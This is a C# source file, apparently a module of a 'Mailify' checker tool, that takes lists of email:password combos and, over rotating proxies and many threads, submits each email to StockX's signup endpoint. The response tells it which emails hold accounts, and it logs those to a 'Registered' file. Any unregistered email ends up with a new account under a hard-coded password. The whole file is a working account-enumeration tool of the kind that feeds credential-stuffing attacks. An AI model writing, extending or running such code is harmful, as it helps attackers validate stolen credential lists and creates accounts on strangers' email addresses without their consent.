using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class StockX_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();
            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);

        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    req.AddHeader("auth0-client", "eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xMC40In0=");
                    req.AddHeader("origin", "https://accounts.stockx.com");
                    req.AddHeader("referer", "https://accounts.stockx.com/login?state=g6Fo2SBwWkpXLThIOW56SFpPREJxM3JLa2o0UXlpMTQ1NXVuWKN0aWTZIGliWW1OTy1BSElvLUFWS3RiWlFRR1RDdk1EdExqQ2hEo2NpZNkgT1Z4cnQ0VkpxVHg3TElVS2Q2NjFXMER1Vk1wY0ZCeUQ&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xNC4zIn0%3D&connection=production&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=signup&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=06575ff9-7e58-4595-a729-1c652e3e7269&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F89.0.4389.90%20Safari%2F537.36&ui_locales=en&lng=en");
                    req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");

                    var res0 = req.Post("https://accounts.stockx.com/dbconnections/signup", "{\"client_id\":\"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD\",\"connection\":\"production\",\"email\":\"" + credentials[0] + "\",\"password\":\"DooButt1234@#$\",\"user_metadata\":{\"first_name\":\"awdwada\",\"last_name\":\"wadwad\",\"language\":\"en-us\",\"gdpr\":\"\",\"first_name_phonetics\":\"\",\"last_name_phonetics\":\"\",\"defaultCurrency\":\"USD\"}}", "application/json");
                    string text0 = res0.ToString();
                    if (text0.Contains("invalid_signup"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text0.Contains("{\"user_id\":\""))
                    {

                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }
                }

            }
            catch 
            {
              
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}